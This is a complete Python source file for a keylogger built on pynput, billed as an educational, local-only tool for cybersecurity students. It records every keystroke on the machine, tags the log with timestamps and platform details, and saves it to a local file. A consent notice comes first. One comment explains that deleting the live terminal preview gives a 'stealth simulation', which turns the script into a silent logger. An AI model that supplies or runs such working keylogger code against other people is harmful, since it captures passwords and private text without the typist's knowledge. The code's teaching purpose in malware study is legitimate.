"""
ethical_keylogger.py
====================
An educational, local-only keylogger built with Python and pynput.

PURPOSE:
    This tool is strictly for learning how keystroke capture works on a local machine.
    It is intended for cybersecurity students studying defensive security, malware analysis,
    and SOC analyst fundamentals.

LEGAL NOTICE:
    Only run this on your OWN machine or with EXPLICIT written consent of the device owner.
    Unauthorized use is illegal and unethical. The author assumes no liability for misuse.
"""

import os
import sys
import time
import threading
import platform
from datetime import datetime
from pynput import keyboard

# CONFIGURATION
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
REPORT_INTERVAL = 60        # seconds between auto-save reports (set to None to disable)
MAX_BUFFER_SIZE = 500        # flush buffer to file after this many keystrokes
SESSION_TIMEOUT = None       # seconds before auto-stop (None = run until manual stop)

# GLOBALS
keystroke_buffer = []
buffer_lock = threading.Lock()
session_start = datetime.now()
keystroke_count = 0
stop_event = threading.Event()

# UTILITIES
def ensure_log_dir():
    """Create the logs directory if it doesn't exist."""
    os.makedirs(LOG_DIR, exist_ok=True)


def get_timestamp():
    """Return a formatted timestamp string."""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def format_key(key):
    """
    Convert a pynput key event into a human-readable string.
    Regular characters are returned as-is; special keys are wrapped in [brackets].
    """
    try:
        # Regular printable character
        return key.char if key.char is not None else f"[{key}]"
    except AttributeError:
        # Special key (e.g., shift, ctrl, enter)
        special_map = {
            "Key.space":     " ",
            "Key.enter":     "\n[ENTER]\n",
            "Key.backspace":  "[BACKSPACE]",
            "Key.tab":       "[TAB]",
            "Key.caps_lock": "[CAPS_LOCK]",
            "Key.shift":     "[SHIFT]",
            "Key.shift_r":   "[SHIFT]",
            "Key.ctrl_l":    "[CTRL]",
            "Key.ctrl_r":    "[CTRL]",
            "Key.alt_l":     "[ALT]",
            "Key.alt_r":     "[ALT]",
            "Key.delete":    "[DELETE]",
            "Key.esc":       "[ESC]",
            "Key.up":        "[↑]",
            "Key.down":      "[↓]",
            "Key.left":      "[←]",
            "Key.right":     "[→]",
        }
        return special_map.get(str(key), f"[{str(key).replace('Key.', '').upper()}]")


def flush_buffer():
    """Write the current buffer to the log file and clear it."""
    global keystroke_buffer

    with buffer_lock:
        if not keystroke_buffer:
            return
        data = "".join(keystroke_buffer)
        keystroke_buffer = []

    ensure_log_dir()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(data)


def write_session_header():
    """Write a session header to the log file."""
    ensure_log_dir()
    header = (
        f"\n{'='*60}\n"
        f"  SESSION STARTED\n"
        f"  Timestamp : {get_timestamp()}\n"
        f"  Platform  : {platform.system()} {platform.release()}\n"
        f"  Python    : {sys.version.split()[0]}\n"
        f"{'='*60}\n\n"
    )
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(header)


def write_session_footer():
    """Write a session summary footer to the log file."""
    elapsed = datetime.now() - session_start
    footer = (
        f"\n\n{'='*60}\n"
        f"  SESSION ENDED\n"
        f"  Timestamp      : {get_timestamp()}\n"
        f"  Total keystrokes: {keystroke_count}\n"
        f"  Duration       : {str(elapsed).split('.')[0]}\n"
        f"{'='*60}\n"
    )
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(footer)

# PERIODIC REPORTER
def periodic_flush():
    """Background thread: flush buffer to disk every REPORT_INTERVAL seconds."""
    while not stop_event.is_set():
        time.sleep(REPORT_INTERVAL)
        flush_buffer()
        print(f"  [auto-save] {get_timestamp()} — {keystroke_count} keystrokes logged so far.")


# KEYBOARD LISTENER CALLBACKS
def on_press(key):
    """Called on every key press event."""
    global keystroke_count

    formatted = format_key(key)

    with buffer_lock:
        keystroke_buffer.append(formatted)
        keystroke_count += 1

    # Flush if buffer is large enough
    if len(keystroke_buffer) >= MAX_BUFFER_SIZE:
        flush_buffer()

    # Live preview in terminal (comment out for stealth simulation)
    print(f"  [{get_timestamp()}] Key: {formatted}", end="\r")


def on_release(key):
    """Called on every key release event. Stops listener on ESC."""
    if key == keyboard.Key.esc:
        print("\n\n  [INFO] ESC detected — stopping keylogger gracefully...")
        stop_event.set()
        return False  # Stops the listener

# MAIN
def main():
    print("\n" + "="*60)
    print("   ETHICAL KEYLOGGER — Educational Use Only")
    print("="*60)
    print(f"   Log file   : {os.path.abspath(LOG_FILE)}")
    print(f"   Started at : {get_timestamp()}")
    print(f"   Press [ESC] to stop the session.\n")
    print("="*60 + "\n")

    write_session_header()

    # Start periodic flush thread if interval is set
    if REPORT_INTERVAL:
        flush_thread = threading.Thread(target=periodic_flush, daemon=True)
        flush_thread.start()

    # Start keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Cleanup
    flush_buffer()
    write_session_footer()

    print(f"\n  Session complete.")
    print(f"  Total keystrokes : {keystroke_count}")
    print(f"  Log saved to     : {os.path.abspath(LOG_FILE)}\n")


if __name__ == "__main__":
    main()
